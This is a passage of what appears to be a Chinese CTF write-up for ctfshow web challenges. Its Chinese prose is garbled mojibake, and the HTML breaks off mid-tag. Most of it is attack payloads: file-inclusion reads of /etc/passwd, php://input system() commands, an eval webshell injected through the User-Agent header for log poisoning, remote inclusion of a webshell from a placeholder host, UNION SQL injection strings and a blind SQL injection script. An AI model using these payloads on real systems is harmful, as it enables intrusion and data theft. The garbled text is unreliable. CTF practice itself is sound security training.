title="æ¢é’ˆæ³„éœ²"></a>æ¢é’ˆæ³„éœ²</h2><p><strong>å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</strong></p><p>/tz.php</p><p>phpinfoå¾—åˆ°flag</p><h2 id="CDNç©¿é€"><a href="#CDNç©¿é€" class="headerlink" title="CDNç©¿é€"></a>CDNç©¿é€</h2><p><strong>é€è¿‡é‡é‡ç¼“å­˜ï¼ŒæŸ¥æ‰¾åˆ°ctfer.comçš„çœŸå®IPï¼Œæäº¤ flag{IPåœ°å€}</strong></p><p>æˆ‘æœç‹—æµè§ˆå™¨è‡ªå¸¦IPåœ°å€æ˜¾ç¤ºï¼šflag{111.231.70.44}</p><p>ä¹Ÿå¯ä»¥é€šè¿‡ping <a href="http://www.ctfshow.comè·å¾—" target="_blank" rel="noopener">www.ctfshow.comè·å¾—</a></p><h2 id="jsæ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#jsæ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="jsæ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>jsæ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p><strong>ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</strong></p><p>view-source</p><p>ç‚¹å¼€ï¼šjs/Flappy_js.js</p><p>å¾—åˆ°è¿™ä¸ªå°æ¸¸æˆçš„æ•´å¥—æºç </p><p>é‡è¦éƒ¨åˆ†ï¼š</p><pre><code>var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;);}else{var result=window.confirm(&quot;GAMEOVER\né„îˆšæƒæµ åº¢æŸŠå¯®â‚¬æ¿®ï¿½&quot;);</code></pre><p>Unicodeè§£ç ï¼šä½ èµ¢äº†ï¼Œå»110.phpçœ‹çœ‹</p><h2 id="å‰ç«¯å¯†é’¥æ³„éœ²"><a href="#å‰ç«¯å¯†é’¥æ³„éœ²" class="headerlink" title="å‰ç«¯å¯†é’¥æ³„éœ²"></a>å‰ç«¯å¯†é’¥æ³„éœ²</h2><p><strong>å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</strong></p><pre><code>&lt;!--    error_reporting(0);    $flag=&quot;fakeflag&quot;    $u = $_POST[&#39;username&#39;];    $p = $_POST[&#39;pazzword&#39;];    if(isset($u) &amp;&amp; isset($p)){        if($u===&#39;admin&#39; &amp;&amp; $p ===&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;){            echo $flag;        }}    --&gt;</code></pre><p>postä¼ å‚æäº¤è¡¨å•å†…å®¹</p><pre><code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><h2 id="æ•°æ®åº“æ¶æ„ä¸‹è½½"><a href="#æ•°æ®åº“æ¶æ„ä¸‹è½½" class="headerlink" title="æ•°æ®åº“æ¶æ„ä¸‹è½½"></a>æ•°æ®åº“æ¶æ„ä¸‹è½½</h2><p><strong>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</strong></p><p>/db/db.mdb</p><p>ä»¥txtæ–‡ä»¶æ ¼å¼ä¿å­˜æ‰“å¼€æœç´¢ctfå¾—åˆ°flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payloadï¼š</p><pre><code>?url=../../../../etc/passwd</code></pre><p>å¾—åˆ°å›æ˜¾ï¼Œè¯´æ˜å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>payload:</p><pre><code>?url=php://input&lt;?php system(&quot;find / -name ctf*&quot;);?&gt;</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š</p><pre><code>/var/www/html/ctf_go_go_go/tmp/html/ctf_go_go_go</code></pre><p>payloadï¼š</p><pre><code>?url=php://input&lt;?php system(&quot;cat /var/www/html/ctf_go_go_go&quot;);?&gt;</code></pre><p><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">å…³äºphp://çš„å…·ä½“ä¿¡æ¯</a>æœ‰å¿…è¦çœ‹ï¼ï¼</p><p><a href="https://www.jb51.net/article/31317.htm" target="_blank" rel="noopener">php://input</a></p><p>ctfshow{99c4134f-64d8-4228-8d29-8fd9ef2682a2}</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code></pre><p>payload:</p><pre><code>?url=../../../../etc/passwd</code></pre><p>å¾—åˆ°å›æ˜¾ï¼Œä½†æ˜¯æ— æ³•ç»§web3çš„æ“ä½œ</p><p><strong>ç¬¬ä¸€ç§ï¼šæ—¥å¿—åŒ…å«</strong><br>é€šè¿‡æŸ¥çœ‹è¯·æ±‚å¤´å¯ä»¥çŸ¥é“æœåŠ¡å™¨ä¸ºnginxï¼Œnginxçš„logåœ¨/var/log/nginx/access.logå’Œ/var/log/nginx/error.logï¼Œå…¶ä¸­access.logå¯ä»¥æ‰“å¼€ã€‚</p><p>ä¸ºäº†é˜²æ­¢urlç¼–ç ï¼Œéœ€è¦åœ¨burpä¸­ä¿®æ”¹UAä¸º</p><pre><code>&lt;?php eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>æ¥ç€èœåˆ€æˆ–èšå‰‘è¿æ¥:</p><pre><code>http://xxxxxxx/?url=/var/log/nginx/access.log</code></pre><p><strong>ç¬¬äºŒç§ï¼šè¿œç¨‹æ–‡ä»¶åŒ…å«</strong>(æœªå®ç°)<br>ä½¿ç”¨è‡ªå·±çš„å…¬ç½‘åœ°å€ï¼Œæˆ–è€…å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™å…è´¹æ³¨å†ŒåŸŸå<a href="https://natapp.cn/ï¼Œå°†ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„80ç«¯å£ä¸Šï¼Œæ‰“å¼€è‡ªå·±ç”µè„‘ä¸Šçš„æœåŠ¡å™¨ï¼Œå°†ä¸€å¥è¯æ–‡ä»¶å†™å…¥ï¼Œç›´æ¥èœåˆ€è¿æ¥" target="_blank" rel="noopener">https://natapp.cn/ï¼Œå°†ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„80ç«¯å£ä¸Šï¼Œæ‰“å¼€è‡ªå·±ç”µè„‘ä¸Šçš„æœåŠ¡å™¨ï¼Œå°†ä¸€å¥è¯æ–‡ä»¶å†™å…¥ï¼Œç›´æ¥èœåˆ€è¿æ¥</a>:</p><pre><code>http://xxxxxxx/?url=http://xxxxxxx/webshell.php</code></pre><h1 id="2021-02-19"><a href="#2021-02-19" class="headerlink" title="2021-02-19"></a>2021-02-19</h1><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"v1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"v2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"where is flag?"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ctype_alpha()å‡½æ•°</strong>æ˜¯PHPä¸­çš„å­—ç¬¦ç±»å‹(CType)å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ä»…åŒ…å«å­—æ¯ã€‚<strong>å¦‚æœå­—ç¬¦ä¸²åªåŒ…å«å­—æ¯è¿”å›true ï¼Œå¦åˆ™è¿”å›FALSEã€‚</strong></p><p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚<strong>æ˜¯è¿”å›trueï¼Œä¸æ˜¯è¿”å›false</strong></p><p>é‚£ä¹ˆè¿™é‡Œï¼=å¦‚æœä¸æ˜¯ï¼Œå°±æ˜¯è¦æ±‚v1å¿…é¡»æ˜¯å­—æ¯ï¼Œv2å¿…é¡»æ˜¯æ•°å­—ï¼ŒåŒæ—¶æ»¡è¶³v1çš„md5=v2çš„md5ï¼Œæ¥ä¸‹æ¥å°±æ¶‰åŠåˆ°ï¼š</p><p><strong>md5æ¼æ´ï¼ˆmd5ç¢°æ’ï¼‰ï¼š</strong></p><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€œ0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0<br>æ‰€ä»¥åªè¦v1ä¸v2çš„md5å€¼ä»¥0Eå¼€å¤´å³å¯ã€‚</p><p><a href="https://blog.csdn.net/qq_38603541/article/details/97108663" target="_blank" rel="noopener">å¸¸è§çš„MD5ç¢°æ’ï¼šmd5å€¼ä¸º0eå¼€å¤´</a></p><p>payloadï¼š</p><pre><code>/?v1=QNKCDZO&amp;v2=240610708</code></pre><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>postä¼ å‚</p><p>payloadï¼š</p><pre><code>username=admin&#39; or 1=1#&amp;password=1</code></pre><p>å‡ºç°sql inject errorï¼Œæµ‹è¯•ç‰¹æ®Šå­—ç¬¦å›æ˜¾ä¸å˜ï¼Œå½“åˆ å»ç©ºæ ¼ï¼Œè¿”å›åˆå§‹é¡µé¢</p><p>ä¸€èˆ¬ç©ºæ ¼è¢«è¿‡æ»¤æœ‰å¦‚ä¸‹æ›¿æ¢æ–¹æ³•<br>/**/<br>()<br>å›è½¦(urlç¼–ç ä¸­çš„%0a)<br>`(tapé”®ä¸Šé¢çš„æŒ‰é’®)<br>tap<br>ä¸¤ä¸ªç©ºæ ¼</p><pre><code>username=admin&#39;%09union%09select%091,2,3=1#&amp;password=1username=admin&#39;%09union%09select%091,database(),3=1#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(table_name),3%09from%09information_schema.tables%09where%09table_schema=database()#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(column_name),3%09from%09information_schema.columns%09where%09table_name=&#39;flag&#39;#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(flag),3%09from%09flag#&amp;password=1</code></pre><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>sqlç›²æ³¨è„šæœ¬ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestss<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">'http://5833fd10-7a3d-4f24-ad5d-93394514f061.chall.ctf.show:8080/index.php'</span>table<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#print(i)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#çˆ†è¡¨å  flag</span>        <span class="token comment" spellcheck="true">#payload = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))</span>        <span class="token comment" spellcheck="true">#çˆ†å­—æ®µå flag</span>        <span class="token comment" spellcheck="true">#payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))</span>        <span class="token comment" spellcheck="true">#è¯»å–flag</span>        payload <span class="token operator">=</span> <span class="token string">"ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#"</span><span class="token operator">%</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        ra <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">'?id=0/**/or/**/'</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> ra<span class="token punctuation">:</span>            table <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-02-20"><a href="#2021-02-20" class="headerlink" title="2021-02-20"></a>2021-02-20</h1><p><strong>hintsï¼šregister.php login.php å¤§ä½¬ä»¬åˆ«æ‰«äº†</strong></p><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å¼€å¯SessionåŠŸèƒ½</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¯»å–Sessionå˜é‡ä¿¡æ¯</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">'select pass from user where name="'</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'4rfvbgt56yhn.sh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>æ‰§è¡Œé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"admin!!!!!"</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span><span class="token string">"/\w\W*/"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"not allowed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æœç´¢å¹¶ä¸”ä½¿ç”¨ä¸€ä¸ªå›è°ƒè¿›è¡Œæ›¿æ¢ã€‚            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"you not admin"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å¼€register.phpæ³¨å†Œé¡µé¢</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>ç”¨æˆ·æ³¨å†Œ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pass<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>postä¼ å‚ï¼Œnameä¸ºå€¼ï¼Œä¸æ­¤é¢˜ç›®æºç ç¬¬ä¸€æ¬¡åˆ¤æ–­æƒ³å¯¹åº”ï¼Œnameä¸èƒ½ä¸ºç©ºå€¼ï¼Œç„¶åå¼€å§‹è¿›è¡Œsqlæ•°æ®åº“çš„æ“ä½œï¼Œç¬¬ä¸‰éƒ¨è¿›è¡Œåˆ¤æ–­nameæ˜¯å¦ä¸ºadminï¼ŒåŒæ—¶è¦é€šè¿‡getä¼ å…¥å‚æ•°cï¼Œåˆ©ç”¨æ­£åˆ™åŒ¹é…æ¥æ›¿æ¢æ‰€æœ‰å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å°±è¦æœç´¢åˆ°å­—ç¬¦å°±è¦æ‰§è¡Œå‡½æ•°</p><p>æœ‰å…³æ­£åˆ™åŒ¹é…çš„çŸ¥è¯†<br>\wï¼šç”¨äºåŒ¹é…å­—æ¯ï¼Œæ•°å­—æˆ–ä¸‹åˆ’çº¿å­—ç¬¦ï¼›<br>\Wï¼šç”¨äºåŒ¹é…æ‰€æœ‰ä¸\wä¸åŒ¹é…çš„å­—ç¬¦ï¼›<br>â€œ*â€å…ƒå­—ç¬¦è§„å®šå…¶å‰å¯¼å­—ç¬¦å¿…é¡»åœ¨ç›®æ ‡å¯¹è±¡ä¸­å‡ºç°é›¶æ¬¡æˆ–è¿ç»­å¤šæ¬¡ï¼›</p><p>åœ¨register.phpæ³¨å†Œåä¸ºadmin  çš„è´¦æˆ·ï¼Œç™»é™†çš„æ—¶å€™æ»¡è¶³cçš„ä¼ å€¼ä¹Ÿä¸ºç©ºæ ¼å³å¯</p><pre><code>http://26e33888-9abc-46aa-a3fc-7700e6f8d41e.chall.ctf.show:8080/?c=   â†ç©ºæ ¼</code></pre><p>å¾—ctfshow{ba51b604-87e6-48bb-bf13-505edd2e8c08}</p><h1 id="2021-4-14ï¼ˆèŒæ–°ï¼‰"><a href="#2021-4-14ï¼ˆèŒæ–°ï¼‰" class="headerlink" title="2021-4-14ï¼ˆèŒæ–°ï¼‰"></a>2021-4-14ï¼ˆèŒæ–°ï¼‰</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre class="line-numbers language-php"><code class="language-php"> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>ctf<span class="token punctuation">.</span>showèŒæ–°è®¡åˆ’web1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># åŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># åˆ¤æ–­getæäº¤çš„å‚æ•°idæ˜¯å¦å­˜åœ¨</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># åˆ¤æ–­idçš„å€¼æ˜¯å¦å¤§äº999</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># id å¤§äº 999 ç›´æ¥é€€å‡ºå¹¶è¿”å›é”™è¯¯</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"id error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># id å°äº 999 æ‹¼æ¥sqlè¯­å¥</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from article where id = $id order by id limit 1 "</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"æ‰§è¡Œçš„sqlä¸ºï¼š$sql&lt;br>"</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># æ‰§è¡Œsql è¯­å¥</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># åˆ¤æ–­æœ‰æ²¡æœ‰æŸ¥è¯¢ç»“æœ</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token shell-comment comment"># å¦‚æœæœ‰ç»“æœï¼Œè·å–ç»“æœå¯¹è±¡çš„å€¼$row</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span 